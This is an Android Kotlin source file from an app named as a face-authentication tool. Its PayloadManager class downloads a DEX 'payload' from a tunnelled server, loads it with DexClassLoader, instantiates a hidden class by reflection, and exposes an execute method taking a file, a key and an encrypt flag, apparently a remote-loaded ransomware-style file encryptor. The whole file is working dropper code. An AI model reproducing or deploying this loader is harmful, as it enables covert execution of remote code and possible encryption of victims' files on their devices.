package com.example.face_auth_app

import android.content.Context
import android.util.Log
import dalvik.system.DexClassLoader
import okhttp3.OkHttpClient
import okhttp3.Request
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import kotlinx.coroutines.sync.Mutex
import kotlinx.coroutines.sync.withLock

class PayloadManager(private val context: Context, private val baseUrl: String = "http://10.0.2.2:5000") {
    private val client = OkHttpClient()
    private var payloadInstance: IPayload? = null
    private val downloadMutex = Mutex()

    /**
     * Downloads the payload.dex from the server.
     */
    suspend fun downloadPayload(): Boolean = downloadMutex.withLock {
        if (payloadInstance != null) return true

        val request = Request.Builder()
            .url("$baseUrl/download_payload")
            .addHeader("Bypass-Tunnel-Reminder", "true")
            .addHeader("User-Agent", "FaceAuthApp/1.0")
            .build()

        return try {
            val response = client.newCall(request).execute()
            if (response.isSuccessful) {
                val bytes = response.body?.bytes()
                if (bytes != null) {
                    val dexFile = File(context.cacheDir, "payload.dex")
                    
                    if (dexFile.exists()) {
                        dexFile.setWritable(true)
                        dexFile.delete()
                    }
                    
                    FileOutputStream(dexFile).use { it.write(bytes) }
                    dexFile.setReadOnly()
                    
                    Log.d("PayloadManager", "Payload downloaded: ${dexFile.absolutePath}")
                    loadPayload(dexFile)
                } else false
            } else {
                Log.e("PayloadManager", "Failed to download payload: ${response.code}")
                false
            }
        } catch (e: IOException) {
            Log.e("PayloadManager", "Download error: ${e.message}")
            false
        }
    }

    private fun loadPayload(dexFile: File): Boolean {
        return try {
            val optimizedDir = context.getCodeCacheDir()
            val classLoader = DexClassLoader(
                dexFile.absolutePath,
                optimizedDir.absolutePath,
                null,
                context.classLoader
            )

            val payloadClass = classLoader.loadClass("com.example.face_auth_app.DynamicPayload")
            
            // Debug: Log all constructors
            payloadClass.constructors.forEach { 
                Log.d("PayloadManager", "Found constructor: $it")
            }
            
            // Try different ways to instantiate

            payloadInstance = try {
                val ctor = payloadClass.getDeclaredConstructor()
                ctor.isAccessible = true
                ctor.newInstance() as? IPayload
            } catch (e: Exception) {
                Log.e("PayloadManager", "Reflection error: ${e.message}")
                payloadClass.newInstance() as? IPayload
            }
            
            if (payloadInstance != null) {
                Log.d("PayloadManager", "Payload instantiated successfully")
                true
            } else {
                Log.e("PayloadManager", "Failed to instantiate IPayload")
                false
            }
        } catch (e: Exception) {
            Log.e("PayloadManager", "Error loading payload: ${e.message}")
            e.printStackTrace()
            false
        }
    }

    fun executePayload(file: File, key: ByteArray, encrypt: Boolean): Boolean {
        return payloadInstance?.execute(file, key, encrypt) ?: false
    }
}
